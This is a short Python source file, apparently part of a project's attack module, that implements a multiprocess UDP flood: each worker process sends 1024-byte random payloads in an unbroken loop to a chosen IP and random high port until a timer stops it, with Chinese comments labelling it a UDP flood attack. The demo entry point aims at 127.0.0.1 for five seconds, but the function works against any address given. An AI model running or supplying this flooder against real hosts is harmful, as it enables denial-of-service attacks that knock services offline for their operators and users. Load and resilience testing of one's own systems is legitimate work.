import socket
import multiprocessing
import time
from multiprocessing import Queue
from os import urandom as randbytes
from modules.attacks import tools as tm
from datetime import datetime
import multiprocessing


def udp_flood_attack(attack_thread_count: int, attacked_node_ip: str, attack_duration: int):
    """
    udp 泛洪
    :param attack_thread_count: 攻击线程数量
    :param attacked_node_ip:  被攻击节点 ip
    :param attack_duration:  攻击时长
    :return:
    """
    # 暂停队列
    stop_queue = Queue(maxsize=1)
    # 攻击线程数量
    attack_processes = []
    # 开启指定数量的攻击进程
    for index in range(attack_thread_count):
        attack_process = multiprocessing.Process(target=udp_flood_attack_single_thread, args=(attacked_node_ip, stop_queue))
        attack_processes.append(attack_process)
        attack_process.start()
        print("hello")
    # 攻击开始时间
    start_time = datetime.now()
    while True:
        time.sleep(1)
        # 当前时间
        current_time = datetime.now()
        # 已经经过的时间
        time_delta_in_seconds = (current_time - start_time).seconds
        # 超过时间退出
        if time_delta_in_seconds > attack_duration:
            break
        else:
            print(time_delta_in_seconds)
    # 向队列发送停止攻击信号
    stop_queue.put("stop attack")
    for attack_process in attack_processes:
        attack_process.join()


def udp_flood_attack_single_thread(attacked_node_ip: str, stop_queue: Queue):
    """
    udp 单进程泛洪攻击
    :param attacked_node_ip: 被攻击节点的 ip
    :param stop_queue: 停止攻击的信号队列
    :return:
    """
    payload_size = 1024
    rand_bytes = randbytes(payload_size)
    rand_port = tm.RandomApi.rand_int(32768, 65535)
    attacked_node_address = (attacked_node_ip, rand_port)
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        udp_socket.sendto(rand_bytes, attacked_node_address)
        if not stop_queue.empty():
            break


if __name__ == "__main__":
    process = multiprocessing.Process(target=udp_flood_attack, args=(1, "127.0.0.1", 5))
    process.start()
